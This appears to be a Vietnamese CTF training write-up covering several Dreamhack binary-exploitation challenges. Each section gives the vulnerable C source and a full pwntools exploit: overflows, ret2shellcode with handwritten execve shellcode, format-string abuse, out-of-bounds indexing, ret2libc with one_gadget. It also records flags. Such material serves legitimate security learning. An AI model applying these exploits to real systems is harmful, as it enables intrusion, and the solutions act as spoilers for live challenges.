# Mục lục

[basic_exploitation_000](https://github.com/wan-hyhty/trainning/tree/task-7#basic_exploitation_000)
[basic_exploitation_001](https://github.com/wan-hyhty/trainning/tree/task-7#basic_exploitation_001)
[shell_basic](https://github.com/wan-hyhty/trainning/tree/task-7#shell_basic)
[Return address overflow](https://github.com/wan-hyhty/trainning/tree/task-7#return-address-overflow)
[basic_exploitation_003](https://github.com/wan-hyhty/trainning/tree/task-7#basic_exploitation_003)
[out_of_bound](https://github.com/wan-hyhty/trainning/tree/task-7#out_of_bound)
[Return to Shellcode](https://github.com/wan-hyhty/trainning/tree/task-7#return-to-shellcode)
[basic_rop_x86](https://github.com/wan-hyhty/trainning/tree/task-7#basic_rop_x86)
[]

# basic_exploitation_000

## Source C

<details> <summary> source C </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}

```

</details>

## Ý tưởng

- Ở đây do NX tắt nên ta có thể ret2shellcode

![image](https://user-images.githubusercontent.com/111769169/227435534-6a3d25ae-90ca-42d2-b85a-e031ab9ee8b7.png)

- Tuy nhiên ta cần lưu ý

![image](https://user-images.githubusercontent.com/111769169/227424886-d07c6086-78f6-4453-a577-3864a27e8e80.png)

- Do để rax của sys_execve() là 0x0b mà hàm scanf không chịu 0x0b nên khi chạy nó sẽ xuất hiện byte 0x00, scanf coi đó là hết chuỗi nhập vào và ngưng đọc tiếp, một xíu nữa em sẽ ví dụ cụ thể

- Đầu tiên chương trình leak stack cho ta, vậy ta sẽ khai thác bằng cách đưa shellcode vào địa chỉ được leak, sau đó ow eip thành địa chỉ leak stack và thực thi shell

## Thực thi

### Bước 1: đưa shellcode vào địa chỉ được leak

- Chương trình leak cho ta địa chỉ ở đỉnh stack luôn, và cần 132 byte để bắt đầu ghi đè eip

```python
payload = shellcode
payload = payload.ljust(132, b"a")
payload += p32(leak_stack)
```

### Bước 2: tạo shellcode

- Bước tạo shell khá khó, chúng ta sẽ dựa vào sys_execve() cần điều kiện gì để viết shell

```asm
    xor    eax,eax              ;eax = 0
    push   eax
    push   0x68732f6e           ; đưa chuỗi /bin/sh vào trong, tuy nhiên chuỗi /bin/sh có  7 byte nên nếu push 7byte chương trình tự đưa byte 0x00, scanf sẽ ngưng đọc tiếp
    push   0x69622f2f           ; do đó em sẽ đưa chuỗi //bin/sh
    mov    ebx,esp              ; đưa //bin/sh vào ebx
    xor    ecx,ecx              ; ecx = 0
    xor    edx,edx              ; edx = 0
    mov    eax,0x0b             ; eax = 0x0b (syscall) nếu dừng ở đây thì shellcode không chia hết cho 4,lúc đó, khi scanf đọc sẽ bị 0x00, và không thể padding các byte "a" được nữa
    inc    eax                  ; mục đích dòng này để tăng shellcode chia hết cho 4
    inc    eax
    inc    eax
    int    0x80
```

- Khi chạy chương trình và kiểm tra stack, không hề có các byte "a" padding, mà còn xuất hiện byte 0x00

![image](https://user-images.githubusercontent.com/111769169/227439138-efe98702-7697-48ba-8624-a37d3818ae7c.png)

- Lý do là ở 0x0b, scanf sẽ không đọc 0x0b nên sẽ trả về 0x00 và coi đó là kết thúc chuỗi nhập vào, để khắc phục ta sửa `mov eax, 0x0b` thành `mov al, 0x8` (này em tham khảo một xíu wu =))) và chạy lại, kiểm tra stack

![image](https://user-images.githubusercontent.com/111769169/227440520-89a111c1-4d1b-4948-b874-2808ba4cb250.png)

- oke đúng rùi và chạy thử xem

![image](https://user-images.githubusercontent.com/111769169/227440857-46774908-a9ed-4458-893a-3cfff48735e4.png)

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227441588-08d8c53a-8e64-4dbc-ba04-6ee247170f92.png)
lưu ý ta nên cat flag luôn vì chương trình có thời gian ngắt

<details> <summary> full script </summary>

```python
from pwn import *
exe = ELF("./basic_exploitation_000")
# r = process(exe.path)
r = remote("host3.dreamhack.games", 13851)
# gdb.attach(r, gdbscript='''
#            b* main+42
#            c
#            ''')

input()
r.recvuntil(b'(')
leak_stack = r.recv(10).decode()
log.info("leak stack: " + leak_stack)

leak_stack = int(leak_stack, 16)

shellcode = asm(
    '''
    xor    eax,eax
    push   eax
    push   0x68732f6e
    push   0x69622f2f
    mov    ebx,esp
    xor    ecx,ecx
    xor    edx,edx
    mov    al,0x8
    inc    eax
    inc    eax
    inc    eax
    int    0x80
     ''', arch="i386"
)
payload = shellcode
payload = payload.ljust(132, b"a")
payload += p32(leak_stack)
r.sendlineafter(b")\n", payload)

r.interactive()
```

</details>

# basic_exploitation_001

## source

<details> <summary> source c </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    gets(buf);

    return 0;
}
```

</details>

## Ý tưởng

- Trong file đã có hàm thực thi cat /flag, kiểm tra checksec
  ![image](https://user-images.githubusercontent.com/111769169/227443934-77791216-6a8e-48f4-9819-56311dd0a220.png)
- Ta đoán ngay là ret2win

## Thực thi

- ta cần 132 byte để ow save rbp, sau đó ta sẽ đưa địa chỉ hàm readflag

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227444598-948620bc-d760-4f63-b31c-47593d75984e.png)

<details> <summary> full script </summary>

```python
from pwn import *

exe = ELF("./basic_exploitation_001")
r = remote("host3.dreamhack.games", 9187)
# r = process(exe.path)

payload = b"a" * 132 + p32(exe.sym['read_flag'])

r.sendline(payload)

r.interactive()
```

</details>

# Return address overflow

## Source C

```c
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

## Ý tưởng

- ta checksec không có canary, có hàm tạo shell, scanf() không giới hạn kí tự nhập vào

## Khai thác

- Ta tìm offset để ow rbp là 56

```python
from pwn import *

exe = ELF("./rao")
# r = process(exe.path)
r = remote("host3.dreamhack.games", 13521)

payload = b"a" * 56 + p64(exe.sym['get_shell'])

r.sendlineafter(b"Input: ", payload)
r.interactive()
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227600958-9ec62751-4e4d-42a0-ad9f-0de489a80fb5.png)

```python
from pwn import *

exe = ELF("./rao")
# r = process(exe.path)
r = remote("host3.dreamhack.games", 15236)

payload = b"a" * 56 + p64(exe.sym['get_shell'])

r.sendlineafter(b"Input: ", payload)
r.interactive()
```

# basic_exploitation_003

## Source C

<details> <summary> scource C </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```

</details>

## Ý tưởng

- mảng `c char stack_buf[0x90] = {};` khai báo 0x90 byte
- `c read(0, heap_buf, 0x80);` nhập vào heap_buf 0x80 byte
- `c sprintf(stack_buf, heap_buf);` lấy chuỗi của heap_buf bỏ vào stack_buf

  > điều này có nghĩa là nếu nhập 0x80 byte heap_buf thì không thể nào ret2win vì không bof stack_buf

- Ở đây ta chú ý hàm `sprintf`, cú pháp của nó là:

```c
sprintf (target, format,... ) ;
// target là chuỗi đích
// format là chuỗi định dạng
```

- ta thấy `c sprintf(stack_buf, heap_buf);` không có định dạng (%s), nên rất có thể là lỗi fmt
- ta thử %p để heap_buf bỏ vào stack_buf thứ gì

![image](https://user-images.githubusercontent.com/111769169/227451048-e93c3cb0-55ce-4826-8660-41caea779a7c.png)

- Đến đây ta có ý tưởng, ta sẽ sử dụng fmt, nhập vào %p = 2byte để ghi vào stack nhiều hơn 2byte, như vậy hoàn toàn có thể ret2win

## Thực thi

- Ở đây do stack thay đổi, chúng ta nên chọn 1 địa chỉ nào trong stack cố định, không đổi độ dài khi chạy local và server, em chọn địa chỉ saved rip, vì mỗi lần chạy nó không thay đổi về độ dài (10 kí tự)

![image](https://user-images.githubusercontent.com/111769169/227505093-b4a7b42b-a045-4354-a02e-8bfd9698f540.png)

- ở vị trí thứ 37 và 16 lần `%37$p` thì nó gần đến địa chỉ rip, và em thêm 12 byte "a" để ow rbp, sau đó ow rip bằng hàm get_shell

```python
payload = b"%37$p" * 16 + b"a" * 12
payload += p32(exe.sym['get_shell'] + 1)
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227506310-2a45dfee-823a-4a99-b958-5027d55031ae.png)

```python
from pwn import *

exe = ELF("./basic_exploitation_003")
# r = process(exe.path)
r = remote("host3.dreamhack.games", 18012)
# gdb.attach(r, gdbscript='''
#            b* main+84
#            c
#            ''')
input()
payload = b"%37$p" * 16 + b"a" * 12
payload += p32(exe.sym['get_shell'] + 1)
r.send(payload)
r.interactive()
```

# shell_basic

## Ý tưởng

Theo đề bài là ta sẽ phải tạo một shellcode để lấy flag ở `/home/shell_basic/flag_name_is_loooooong` thì chúng ta cần các như: syscall_open (để mở file), syscall_read (để đọc dữ liệu), syscall_write (để ghi ra màn hình) và exit

## Thực thi

- Khi tham khảo các wu em thấy có khái niệm opcode, được hiểu mơ hồ là một loại mã cho máy biết phải làm gì, tức là phải thực hiện thao tác nào. Opcode là một loại hướng dẫn ngôn ngữ máy.
- asm của nó là `push 0`

### syscall_open

![image](https://user-images.githubusercontent.com/111769169/226924551-6462ae35-9e2e-411e-b527-31af3f71d8fb.png)

- rdi: địa chỉ file `/home/shell_basic/flag_name_is_loooooong`
- rsi = 0
- rdx = 0

Đầu tiên ta sẽ push đường dẫn file flag vào stack

```asm
    push 1
    mov rax, 0x676E6F6F6F6F6F6F         ;"oooooong"
    push rax
    mov rax, 0x6C5F73695F656D61         ;'ame_is_l'
    push rax
    mov rax, 0x6E5F67616C662F63         ; 'c/flag_n'
    push rax
    mov rax, 0x697361625f6c6c65         ; 'ell_basi'
    push rax
    mov rax, 0x68732f656d6f682f         ; '/home/sh'
    push rax
```

Sau đó ta sẽ setup các thanh ghi sao cho

- rax = 0x2
- rdi = `/home/shell_basic/flag_name_is_loooooong`
- rsi = 0 (RD_ONLY)
- rdx = 0

```asm
    ;set sys_open
    mov rax, 0x2
    mov rdi, rsp                        ; RD_only
    xor rsi, rsi
    xor rdx, rdx
    syscall
```

### sys_read

![image](https://user-images.githubusercontent.com/111769169/226928405-d4f75f67-4b87-4388-8361-83ade81bed20.png)
Ta sẽ setup:

- rax : 0x00
- rdi : là đặc tả file (fd)
- rsi : buf
- rdx : len

```asm
    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x30                       ; rsi = rsp - 0x30, buf
    mov rdx, 0x30                       ; rdx = 0x30, len
    mov rax, 0x0                        ; rax = 0
    syscall
```

### sys_write

![image](https://user-images.githubusercontent.com/111769169/226931783-591deeef-3e02-4fe8-a90f-152f4f0109df.png)
Ta cần setup các thanh ghi:

- rax : 0x01
- rdi : fd
- rsi : buf
- rdx : len

```asm
    mov rax, 0x1
    mov rdi, 1      ; fd = stdout
    syscall
```

sau đó ta dùng tool [link](https://defuse.ca/) để đổi asm thành mã máy
`\x6a\x00\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6E\x67\x50\x48\xB8\x61\x6D\x65\x5F\x69\x73\x5F\x6C\x50\x48\xB8\x63\x2F\x66\x6C\x61\x67\x5F\x6E\x50\x48\xB8\x65\x6C\x6C\x5F\x62\x61\x73\x69\x50\x48\xB8\x2F\x68\x6F\x6D\x65\x2F\x73\x68\x50\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\x83\xEE\x30\x48\xC7\xC2\x30\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x0F\x05`

<details> <summary> script asm </summary>

```asm
    push 0x0
    mov rax, 0x676E6F6F6F6F6F6F         ;"oooooong"
    push rax
    mov rax, 0x6C5F73695F656D61         ;'ame_is_l'
    push rax
    mov rax, 0x6E5F67616C662F63         ; 'c/flag_n'
    push rax
    mov rax, 0x697361625f6c6c65         ; 'ell_basi'
    push rax
    mov rax, 0x68732f656d6f682f         ; '/home/sh'
    push rax

    ;set sys_open
    mov rax, 0x2
    mov rdi, rsp                        ; RD_only
    xor rsi, rsi
    xor rdx, rdx
    syscall

    ;set sys_read
    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x30                       ; rsi = rsp - 0x30, buf
    mov rdx, 0x30                       ; rdx = 0x30, len
    mov rax, 0x0                        ; rax = 0
    syscall

    mov rax, 0x1
    mov rdi, 1      ; fd = stdout
    syscall
```

</details>

---

# out_of_bound

## source

<details> <summary> source C </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char \*command[10] = { "cat",
"ls",
"id",
"ps",
"file ./oob" };
void alarm_handler()
{
puts("TIME OUT");
exit(-1);
}

void initialize()
{
setvbuf(stdin, NULL, \_IONBF, 0);
setvbuf(stdout, NULL, \_IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);

}

int main()
{
int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;

}
```

</details>

## Ý tưởng

- Ở đây, ta chú ý đoạn code này, ở đây chúng ta nhận `idx` là 0, 1, 2 để thông qua system thực hiện các lệnh ls, id, ...
- Tuy vậy ta hoàn toàn có thể truy cập các giá trị ngoài mảng `command`

```c
    char \*command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };

    scanf("%d", &idx);

    system(command[idx]);
```

- Thông qua ida ta kiểm được địa chỉ mảng `command` và mảng `name`, và khi trừ thì ta thấy mảng `command` được khai báo trước mảng `name`

```
>>> name = 0x804A0AC
>>> command = 0x804A060
```

- Đến đây, ta có thể đoán được ta sẽ truyền chuỗi `/bin/sh` vào `name`, sau đó ta nhập vào giá trị `idx` tại chuỗi `/bin/sh`

## Thực thi

- Đầu tiên ta sẽ tìm giá trị `idx`

```
>>> name - command
76
>>> 76/4
19.0
```

- Vậy tại vị trí `command[19]` ta sẽ truyền vào chuỗi `/bin/sh` vào main và chạy thử, và lỗi =))

```
Admin name: /bin/sh
What do you want?: 19
```

- Ta thử gdb và dừng ngay hàm system

![image](https://user-images.githubusercontent.com/111769169/227205825-b4c943fb-7028-43a2-9bdd-1d9657a7d41a.png)

- Ở đây system chỉ thực hiện chuỗi `/bin`, để chắc chắc ta sẽ kiểm tra ida và kết quả là: `system((&command)[v4[0]]);`

- Vậy ta sẽ truyền `v4[0]` là địa chỉ của chuỗi `/bin/sh`,để khi thực hiện system, chương trình lấy chuỗi `/bin/sh`

- Do file 32bit mà cuỗi `/bin/sh` có 7 byte nên em thêm byte null vào cuối chuỗi tránh bị lỗi, nối chuỗi /bin/sh vào các chuỗi khác
<details> <summary> script </summary>

```python
from pwn import *

from pwn import *

exe = ELF("./out_of_bound")
# r = process(exe.path)
r = remote("host3.dreamhack.games", 18672)
name = 0x804A0AC + 4
payload = p32(name) + b"/bin/sh\0"

r.sendlineafter(b"name: ", payload)
r.sendlineafter(b"want?: ", b"19")

r.interactive()
# DH{2524e20ddeee45f11c8eb91804d57296}
```

</details>

---

# Return to Shellcode

## source C

<details> <summary> Source </summary>

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

</details>

## Ý tưởng

- Ở đây chương trình yêu cầu ta leak canary, ta thấy đoạn code này,

```c
  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);
```

- Ta hoàn toàn có thể leak được canary để lần nhập thứ 2 ta sẽ ghi lại canary và ow rip thành địa chỉ buf để thực thi shellcode (do NX tắt)

> ý tưởng hơi lag =)), nên để em vừa thực thi vừa nêu lại ý tưởng =))

## Thực thi

### Leak canary

- Đầu tiên chương trình yêu cầu ta leak canary, mà offset từ buf đến trước canary là 88, do đó ta sẽ ow đến trước canary xem %s có leak được canary cho ta ko

![image](https://user-images.githubusercontent.com/111769169/227687986-04a30903-124a-4ca0-8455-f546c379c16b.png)

- Tuy nhiên nó chăng leak cho canary

![image](https://user-images.githubusercontent.com/111769169/227688887-501743d4-75d6-4bfc-ad75-e9ab6094647f.png)

- Ta cần nhớ một lí thuyết về %s
- %s sẽ in chuỗi đến khi gặp byte 0x00, ở đây khi in được 88 byte a nó gặp phải byte 0x00 của canary, nó sẽ ngừng in

![image](https://user-images.githubusercontent.com/111769169/227689059-8267e3bf-1647-4d65-9445-cfb0ded8b02d.png)

- Vậy mục tiêu của ta sẽ làm sao thay đổi byte 0x00 đó
- Em chọn cách ghi đè 0x00 là byte 0x61 sau đó ta sẽ lấy giá trị leak được trừ đi 0x61 để trả lại byte 0x00
- Ta sẽ nhập vào 89 byte a để ghi đè 0x00 của canary

```python
payload1 = b"a" * 89
r.sendafter(b"Input: ", payload1)
r.recvuntil(b"a" * 88)
leak = u64(r.recv(8)) - 0x61
log.info("leak canary " + hex(leak))
```

- Đây là những byte ta nhận được và ta sẽ nhận 8 byte được em tô, vì sao

![image](https://user-images.githubusercontent.com/111769169/227689369-f98c7956-288e-422e-a674-bd6dec88d514.png)

- Ta kiểm tra stack thì canary là `0x0e16b884a8303c61` đã bị thay đổi, ta dựa vào những byte không bị thay đổi để xác định

### ret2shellcode

- Ta đã có canary nên ta có thể ghi đè canary, ghi rip trở về buf trong stack để thực thi shellcode
- Ta sẽ lấy địa chỉ stack của buf ban đầu chương trình cho, ghi shellcode vào đó

```python
shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    syscall
    ''', arch='amd64'
)
payload2 = shellcode
payload2 = payload2.ljust(88, b"a")
payload2 += p64(leak) + b"a"*8 + p64(leak_stack)
r.sendlineafter(b"Input: ", payload2)
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227689895-4e3f0bdd-f844-4577-8970-1136687d9d18.png)

<details> <summary> full script </summary>

```python
from pwn import *
exe = ELF("./r2s_patched")
r = remote("host3.dreamhack.games", 13430)
# r = process("./r2s_patched")
# gdb.attach(r, gdbscript='''
#            b* main+159
#            c
#            ''')
input()
r.recvuntil(b"buf: ")
leak_stack = int(r.recvline(keepends=False).decode(), 16)
log.info("leak stack: " + hex(leak_stack))

payload1 = b"a" * 89
r.sendafter(b"Input: ", payload1)
r.recvuntil(b"a" * 88)
leak = u64(r.recv(8)) - 0x61
log.info("leak canary " + hex(leak))

shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    syscall
    ''', arch='amd64'
)
payload2 = shellcode
payload2 = payload2.ljust(88, b"a")
payload2 += p64(leak) + b"a"*8 + p64(leak_stack)
r.sendlineafter(b"Input: ", payload2)

r.interactive()

```

</detials>

# basic_rop_x86

## source

<details> <summary> source C </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

</details>

## Ý tưởng

- Ở đây chúng ta không có hàm tạo system() cùng với đề bài chúng ta sẽ phải ret2libc nhưng với bản 32bit
- Ở bản 32 bit việc ret2libc khá là khác so với 64bit, ban đầu em chưa thấy sự khác nhau nhưng sau một khoảng thời gian, em đọc wu về các bài ret2libc 32bit thì em thấy để leak được libc ta sẽ làm như sau:

```
payload = [140 bytes buffer] + [puts@plt] + [main()] + [puts@got]
```

## Khai thác

### Bước 1: ta cần leak được địa chỉ libc, tính base libc

- Để leak được base libc ta sẽ làm như `payload = [140 bytes buffer] + [puts@plt] + [main()] + [puts@got]` chỉ khác ở bao nhiêu byte buffer, ở đây em tính được 0x48 byte thì ow được saved rbp

```python
    pop_ebp = 0x0804868b            # em dung ROPgadget de lay pop ebp

    payload = b"A"*0x48
    payload += p32(exe.plt['puts'])
    payload += p32(pop_ebp)
    payload += p32(exe.got['puts'])
    payload += p32(exe.sym['main'])
    r.send(payload)
```

- Khi này ta leak được khoảng 4 địa chỉ
  ![image](https://user-images.githubusercontent.com/111769169/227420546-a1953367-c8cf-490f-98b5-a8c6698d24ed.png)
- Đến đây, ta sẽ unpack và ghi ra màn hình để kiểm tra

```python
r.recvuntil(b"A"*64)
leak1 = u32(r.recv(4))
leak2 = u32(r.recv(4))
leak3 = u32(r.recv(4))
leak4 = u32(r.recv(4))

log.info("leak 1 " + hex(leak1))
log.info("leak 2 " + hex(leak2))
log.info("leak 3 " + hex(leak3))
log.info("leak 4 " + hex(leak4))
```

- Ta nhận được như hình, ta có thể nhận giá trị leak 1, 3, 4 để tính base libc, ở đây e chọn leak 1 để tính base libc

![image](https://user-images.githubusercontent.com/111769169/227421250-dad69508-910b-486d-9019-b4ad26384b7f.png)

```python
r.recvuntil(b"A"*64)
leak1 = u32(r.recv(4))
leak2 = u32(r.recv(4))
leak3 = u32(r.recv(4))
leak4 = u32(r.recv(4))
libc.address = leak1 - 389440

log.info("leak 1 " + hex(leak1))
log.info("leak 2 " + hex(leak2))
log.info("leak 3 " + hex(leak3))
log.info("leak 4 " + hex(leak4))
log.info("base libc " + hex(libc.address))
```

- Kiểm tra lại, thấy đuôi 000 chắc là đúng rồi =)))

![image](https://user-images.githubusercontent.com/111769169/227422644-f52f900e-d1a7-4163-911a-eb9d438420e5.png)

### Bước 2: One_gadget

- Ở đây ta sử dụng one_gadget để tạo shell, sau khi kiểm tra em thấy shell thứ 3 thoả điều kiện nên em lấy lun

![image](https://user-images.githubusercontent.com/111769169/227423024-73a0112c-f9ae-40b9-ba57-8e5ff5efd305.png)

```python
one_gadget = libc.address + 0x3a812
payload2 = b"a" * 0x48 + p32(one_gadget)
r.send(payload2)
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227423486-a01ff46e-eb64-43cf-9e1c-1498e22b0a5b.png)

<details> <summary> full script </summary>

```python
from pwn import *
libc = ELF("./libc.so.6")
exe = ELF("./basic_rop_x86_patched")
r = remote("host3.dreamhack.games", 16535)
# r = process(exe.path)
# gdb.attach(r, gdbscript='''
#            b*main+45
#            c
#            ''')
input()
pop_ebp = 0x0804868b

payload = b"A"*0x48
payload += p32(exe.plt['puts'])
payload += p32(pop_ebp)
payload += p32(exe.got['puts'])
payload += p32(exe.sym['main'])
r.send(payload)

r.recvuntil(b"A"*64)
leak1 = u32(r.recv(4))
leak2 = u32(r.recv(4))
leak3 = u32(r.recv(4))
leak4 = u32(r.recv(4))
libc.address = leak1 - 389440

log.info("leak 1 " + hex(leak1))
log.info("leak 2 " + hex(leak2))
log.info("leak 3 " + hex(leak3))
log.info("leak 4 " + hex(leak4))
log.info("base libc " + hex(libc.address))

one_gadget = libc.address + 0x3a812
payload2 = b"a" * 0x48 + p32(one_gadget)
r.send(payload2)

r.interactive()

# DH{ff3976e1fcdb03267e8d1451e56b90a5}

```

</details>

# basic_rop_x64

## Source c

```c
<details> <summary> Source C </summary>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
puts("TIME OUT");
exit(-1);
}

void initialize() {
setvbuf(stdin, NULL, \_IONBF, 0);
setvbuf(stdout, NULL, \_IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);

}

int main(int argc, char \*argv[]) {
char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;

}
```

</details>

## Ý tưởng

- Y hệt bài rop x86, không có canary, có file libc từ đề ta có thể dùng one_gadget để tạo shell nhanh chóng

## Thực thi

### Leak libc, tìm libc base

- Ta tìm offset để ow saved rbp là 72, kiểm tra got thì có hàm puts, ta leak libc bằng cách dùng put@plt kèm với pop_rdi

```python
pop_rdi = 0x0000000000400883
payload = b"a" * 72
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
r.sendline(payload)
```

- Tính libc base

```python
r.recvuntil(b"a" * 0x40)
leak_libc = u64(r.recvline(keepends=False) + b"\0\0")
log.info("leak libc: " + hex(leak_libc))
libc.address = leak_libc - 456336
```

### one_gadget

- Sau khi kiểm tra ở lệnh ret có thanh `rax = NULL` ta có thể sử dụng gadget `one_gadget = 0x45216`

```python
payload1 = b"a" * 72 + p64(libc.address + one_gadget)
r.sendline(payload1)
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/227794396-2ca0de00-c3a4-438d-8740-a9065ae8096c.png)

<details> <summary> full script </summary>

```python
from pwn import *
exe = ELF("./basic_rop_x64_patched")
libc = ELF("./libc.so.6")
r = remote("host3.dreamhack.games", 22549)
# r = process("./basic_rop_x64_patched")
# gdb.attach(r, gdbscript='''
#            b*main+67
#            c
#            ''')
input()
pop_rdi = 0x0000000000400883
payload = b"a" * 72
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
r.sendline(payload)

r.recvuntil(b"a" * 0x40)
leak_libc = u64(r.recvline(keepends=False) + b"\0\0")
log.info("leak libc: " + hex(leak_libc))
libc.address = leak_libc - 456336
one_gadget = 0x45216

payload1 = b"a" * 72 + p64(libc.address + one_gadget)
r.sendline(payload1)
r.interactive()
```

</details>

# sint

## Source

<details> <summary> Source </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

// void initialize()
// {
//     setvbuf(stdin, NULL, _IONBF, 0);
//     setvbuf(stdout, NULL, _IONBF, 0);

//     signal(SIGALRM, alarm_handler);
//     alarm(30);
// }

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    // initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);
    printf("%d\n", size);
    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```

</details>

## Ý tưởng

- Hướng đi của ta là sẽ gây lỗi `SIGSEGV` để thực thi shell, nghĩa là sẽ phải ow rip, gây lỗi `SIGSEGV`

- Sau một thời gian nghĩ và thảo luận với nhau thì ta thấy ở hàm tham số thứ 3 của hàm read là `size - 1` (Số lượng phần tử để đọc) thường là số dương, vậy nếu ta nhập số 0 và thì tham số thứ 3 mang giá trị âm. Vậy có gây lỗi không?
- Theo chat-gdb như sau

```
Nếu tham số nmemb có giá trị âm, hàm read() sẽ trả về -1 và đặt biến errno thành EINVAL, indicatinig một lỗi.
```

## Thực thi

- Đầu tiên khi được hỏi size thì ta sẽ trả lời 0
- Data: ta sẽ nhập thử 10 byte "a"

```
Size: 0
Data: qqqqqqqqqqqq
ls
```

- Chương trình lỗi nhưng chưa chiếm được shell, vì nếu nhập số lượng byte nhỏ hơn 256 của buf, chương trình chỉ nhận được lỗi `EINVAL` của read() mà ta chỉ chiếm được shell khi có lỗi `SIGSEGV`
- Vậy nên ta sẽ nhập cỡ 280 byte "a"

```
Size: 0
Data: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
ls
flag
sint
cat flag
